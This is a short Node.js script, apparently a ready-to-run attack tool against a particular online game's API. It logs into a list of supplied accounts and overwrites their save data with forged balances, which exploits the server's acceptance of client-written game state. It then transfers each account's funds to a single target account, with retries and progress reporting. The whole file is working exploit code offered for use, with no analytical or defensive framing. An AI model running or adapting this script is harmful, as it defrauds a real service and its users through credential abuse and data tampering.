// job.js — drain with boot+repair. needs TEMPLATE_U / TEMPLATE_P secrets (see below)
const API = 'https://lagoslife.eliysites.com/api';
const MODE = process.env.MODE || 'drain', TO = process.env.TO || '';
const FEE = 50, MIN = 100, SEED = 1096000;
const ledger = JSON.parse(process.env.ACCS_JSON || '[]');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const jar = res => {
  const all = res.headers.getSetCookie ? res.headers.getSetCookie() : [res.headers.get('set-cookie')].filter(Boolean);
  return all.map(c => c.split(';')[0]).join('; ');
};
const login = async (u, p) => {
  const r = await fetch(`${API}/auth/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
  return r.ok ? { 'content-type': 'application/json', 'cookie': jar(r) } : null;
};
(async () => {
  // template shape for booting null-game accounts
  let clean = null;
  const TH = await login(process.env.TEMPLATE_U, process.env.TEMPLATE_P);
  if (TH) {
    const ts = await fetch(`${API}/save`, { headers: { cookie: TH.cookie } }).then(r => r.json());
    if (ts?.game) { clean = JSON.parse(JSON.stringify(ts.game)); clean.money = SEED; }
  }
  console.log(clean ? 'template ready' : 'template login failed — boot disabled', ledger.length, 'accounts');
  let booted = 0, repaired = 0, drained = 0, broke = 0, fail = 0, total = 0;
  const start = Date.now();
  for (let i = 0; i < ledger.length; i++) {
    const a = ledger[i];
    try {
      const H = await login(a.u, a.p);
      if (!H) { fail++; continue; }
      const get = async () => fetch(`${API}/save?t=${Date.now()}`, { headers: { cookie: H.cookie } }).then(r => r.json());
      const put = (game, base) => fetch(`${API}/save`, { method: 'PUT', headers: H, body: JSON.stringify({ game, base }) });
      let sv = await get();
      if (!sv?.game && clean) { // BOOT
        const g = JSON.parse(JSON.stringify(clean));
        g.sim.name = a.u;
        const br = await put(g, sv.now ?? Date.now());
        if (br.ok) { booted++; await sleep(150); sv = await get(); }
        else { fail++; continue; }
      }
      if (!sv?.game) { fail++; continue; }
      if (Number(sv.game.money) < MIN + FEE) { // REPAIR
        const g = JSON.parse(JSON.stringify(sv.game));
        g.money = SEED;
        if (!(await put(g, sv.updatedAt ?? sv.now)).ok) { broke++; continue; }
        repaired++; await sleep(150); sv = await get();
      }
      let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE; // DRAIN
      if (amount < MIN) { broke++; continue; }
      let ok = false;
      for (let t = 0; t < 3 && !ok; t++) {
        const sr = await fetch(`${API}/send`, { method: 'POST', headers: H, body: JSON.stringify({ to: TO, amount }) });
        if (sr.ok) { ok = true; total += amount; drained++; }
        else {
          const err = await sr.text();
          if (err.includes('try again')) { await sleep(3000); continue; }
          const have = Number((err.match(/have ₦([\d,]+)/) || [])[1]?.replace(/,/g, ''));
          if (have) { amount = have - FEE; await sleep(800); continue; }
          fail++; break;
        }
      }
      if ((drained + booted + repaired) % 50 === 0 && i > 0) {
        const el = (Date.now() - start) / 1000, done = drained + fail + broke, rate = done / el;
        console.log(`progress ${done}/${ledger.length} | drained:${drained} ₦${total.toLocaleString()} | ${rate.toFixed(1)}/s | ETA ${Math.ceil((ledger.length - i - 1) / rate)}s`);
      }
      await sleep(50);
    } catch (e) { fail++; }
  }
  console.log(`DONE in ${((Date.now() - start) / 60000).toFixed(1)}min | booted:${booted} repaired:${repaired} drained:${drained} broke:${broke} fail:${fail} | ₦${total.toLocaleString()}`);
})();
